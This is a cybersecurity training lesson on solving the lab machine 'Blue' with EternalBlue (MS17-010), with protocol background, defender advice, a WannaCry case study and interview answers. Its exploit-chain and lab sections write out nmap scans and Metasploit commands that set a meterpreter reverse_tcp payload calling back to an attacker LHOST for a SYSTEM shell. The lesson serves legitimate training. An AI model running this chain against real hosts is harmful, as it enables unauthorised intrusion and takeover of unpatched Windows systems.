Solve Your First Easy HTB/THM Box

Walkthroughs teach you what someone else did. Solving a box without a guide teaches you to think like an attacker. Today you do it on your own.

THEORY

EternalBlue (MS17-010): Discovered by the NSA and leaked by the Shadow Brokers in 2017, EternalBlue exploits a vulnerability in Microsoft's Server Message Block (SMB) protocol. The vulnerability (CVE-2017-0144) exists in how SMBv1 handles specially crafted packets — specifically, it allows arbitrary code execution by exploiting a buffer overflow in the SMB driver. The exploit targets the SMB_COM_TRANSACTION2 command, using a malformed SMB packet that triggers a pool overflow, which the attacker uses to execute shellcode in kernel context. A Metasploit module (exploit/windows/smb/ms17_010_eternalblue) automates this process, but understanding the underlying mechanics — the SMB protocol, the heap spray, and the shellcode execution — separates a professional from a script kiddie.

The exploit chain:

1. Reconnaissance: Scan for open port 445 (SMB) and identify Windows version nmap -p 445 --script smb-vuln-ms17-010 10.10.10.x 2. Verify vulnerability: The nmap script checks if the target is vulnerable Host is likely VULNERABLE to MS17-010 (Windows 7/2008 x64) 3. Exploit with Metasploit msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 > set RHOSTS 10.10.10.x msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6 > set LHOST 10.10.14.x msf6 > exploit 4. Post-exploitation: Get SYSTEM shell, dump hashes, find flags meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > shell

The methodology for solo box solving: Without a walkthrough, you must follow a systematic approach. Start with port scanning (nmap -p- -sV). Identify each service. Check for known vulnerabilities with searchsploit or nmap vulnerability scripts. If you find a potential exploit, understand what it does before running it. After gaining a foothold, enumerate locally (users, OS version, running services, writable directories). Chain your attack — one vulnerability gets you initial access, another gets you root. Document everything because you'll reference this process for every future box.

Key insight: The most important skill is not execution — it's knowing what to enumerate next. The box doesn't have infinite attack surface. There are a limited number of ports, services, and misconfigurations. If you've enumerated everything and still can't find the path, you missed something. Go back and enumerate more thoroughly, especially in areas you rushed through.
// attacker vs defender mindset
⚔ Attacker
  • Start with a full port scan (nmap -p- --min-rate 1000) before any service-specific scanning. Knowing every open port is more important than knowing every detail about one port.
  • If you find SMB open, always run --script smb-vuln-* and --script smb-enum-*. EternalBlue, MS17-010, SMBGhost — these are easy wins on unpatched Windows boxes.
  • Try default credentials on every service — admin:admin, root:root, guest:guest. Many easy boxes have intentional default credential scenarios.
  • After getting a foothold, don't rush to root. Collect your bearings: whoami, ipconfig/ifconfig, listing users, checking running processes — this tells you what the box is about and what your privesc path might be.
🛡 Defender
  • Block SMBv1 on all Windows systems — disable it via PowerShell (Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol). EternalBlue only works against SMBv1.
  • Apply security patches promptly — MS17-010 was patched in March 2017. The fact that it's still exploited in 2024 shows the scale of patch management failures.
  • Use host-based firewalls to restrict SMB (445) to only authorized subnets. This port should never be accessible from the internet.
  • Deploy EDR that detects EternalBlue exploitation patterns — the heap spray and shellcode injection have distinct signatures that modern EDR tools can identify.
// real named incident
2017 — WANNACRY RANSOMWARE — 200,000+ SYSTEMS ACROSS 150 COUNTRIES
EternalBlue (MS17-010) was the initial infection vector for the largest ransomware outbreak in history
On May 12, 2017, the WannaCry ransomware worm spread across 150 countries in a matter of hours, infecting over 200,000 systems — including the UK's National Health Service (NHS), Spanish telecommunications firm Telefonica, FedEx, and Deutsche Bahn. The initial infection vector was EternalBlue — the SMB vulnerability exploit developed by the NSA and leaked by the Shadow Brokers. WannaCry used EternalBlue to infect the first machine, then propagated internally using the same exploit, spreading to every unpatched Windows system on the network. The attack caused an estimated $4 billion in damages. The NHS had to cancel 19,000 medical appointments. A 22-year-old security researcher accidentally stopped the spread by registering a domain name found in the malware's kill switch. The attack highlighted the catastrophic consequences when a nation-state exploit is leaked and weaponized by criminal groups.
HANDS-ON LAB

Goal: solve an easy HTB or THM machine from start to finish without following a walkthrough — complete enumeration, exploitation, and privilege escalation independently.

  1. Choose a target: HTB "Blue" (Windows 7, EternalBlue), THM "Blue" (free room), or THM "Alfred" (easy Windows). Connect to the platform's VPN or start the machine.
  2. Run initial reconnaissance: nmap -p- --min-rate 1000 -sV TARGET_IP. Identify all open ports. Note the Windows version from the SMB fingerprint.
  3. Check for SMB vulnerabilities: nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP. If vulnerable, open Metasploit and configure the EternalBlue module.
  4. Exploit with: use exploit/windows/smb/ms17_010_eternalblue. Set PAYLOAD to windows/x64/meterpreter/reverse_tcp, set RHOSTS and LHOST, then exploit.
  5. Verify you're SYSTEM: getuid should show NT AUTHORITY\SYSTEM. Find flags: search -f flag.txt and search -f user.txt. Read cat flag.txt.
  6. Document every command and finding. If you get stuck for 30+ minutes on one step, enumerate more rather than checking a walkthrough — note what you missed.
Deliverable: A complete writeup of your box solution including: IP, open ports, vulnerability identified, exploit commands (or Metasploit configuration), proof of SYSTEM/root access, and flags captured. No step should say "I used the exploit" — explain what the exploit does.

INTERVIEW READY
Q: "Walk me through how you solved your first HTB/THM machine."
A: "I started with [machine name]. My initial nmap scan revealed [ports]. I noticed SMB on port 445, ran the nmap script for MS17-010, and confirmed it was vulnerable. I used the Metasploit EternalBlue module to exploit the buffer overflow in SMBv1, which gave me a Meterpreter shell as SYSTEM. I found the user flag in C:\Users\user\Desktop\user.txt and the root flag in C:\Users\Administrator\Desktop\root.txt. The key learning was that systematic enumeration — scanning all ports, not just common ones — was what led me to the right attack vector."
Q: "What is EternalBlue and why does it work?"
A: "EternalBlue exploits a buffer overflow in the SMBv1 protocol's handling of crafted SMB_COM_TRANSACTION2 packets — specifically in the SrvOs2FeaListSizeToNt function. The overflow corrupts kernel memory, allowing the attacker to execute arbitrary code with SYSTEM privileges. The exploit requires no authentication and works on unpatched Windows 7, 2008, and XP systems. Microsoft released MS17-010 in March 2017, but many systems remain unpatched, which is why it's still exploited in both CTF boxes and real ransomware attacks."
Q: "What's the most important thing you learned from solving your first box without a walkthrough?"
A: "The importance of methodical enumeration. When I was stuck, I wasn't out of options — I just hadn't checked everything. The vulnerability was there; I hadn't found it because I assumed it wasn't there after a quick scan. Now I have a checklist: full port scan, service versions, vulnerability scripts, directory brute-force, default credentials, web technologies. I don't skip any step, and I don't assume anything. The box creator left a path — my job is to find it through systematic checking, not guesswork."
